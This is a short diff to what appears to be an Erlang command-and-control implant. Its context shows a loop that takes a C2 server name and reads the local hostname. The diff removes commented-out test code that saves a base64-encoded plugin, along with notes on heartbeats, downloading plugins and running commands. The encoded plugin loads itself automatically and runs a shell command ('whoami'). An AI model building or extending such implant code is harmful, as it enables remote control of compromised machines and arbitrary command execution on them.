@@ -26,16 +26,6 @@ run_commands([CMD|Rest], Results) ->
 run_commands([],Results) ->
     lists:reverse(Results).
 
-%start() ->
-%    FileName = savePlugin("test","LW1vZHVsZSh0ZXN0KS4KLWV4cG9ydChbc3RhcnQvMCxnZXRfcmVzdWx0LzBdKS4KLW9uX2xvYWQoc3RhcnQvMCkuCgpzdGFydCgpIC0+CiAgICBpbzpmb3JtYXQoIkhJIEZST00gVEVTVCBQTFVHSU5+biIpLgoKZ2V0X3Jlc3VsdCgpIC0+CiAgICBpbzpmb3JtYXQoIlJ1bm5pbmcgY29kZX5uIiksCiAgICBvczpjbWQoIndob2FtaSIpLgo="),
-%    io:format("Saved ~p~n",[FileName]),
-%    run_commands([FileName]).
-
-% loop with
-% heartbeat
-% download plugins to temp files and save file names
-% run commands
-
 loop(C2ServerName) ->
     io:format("Starting loop~n"),
     {_, Hostname} = inet:gethostname(),
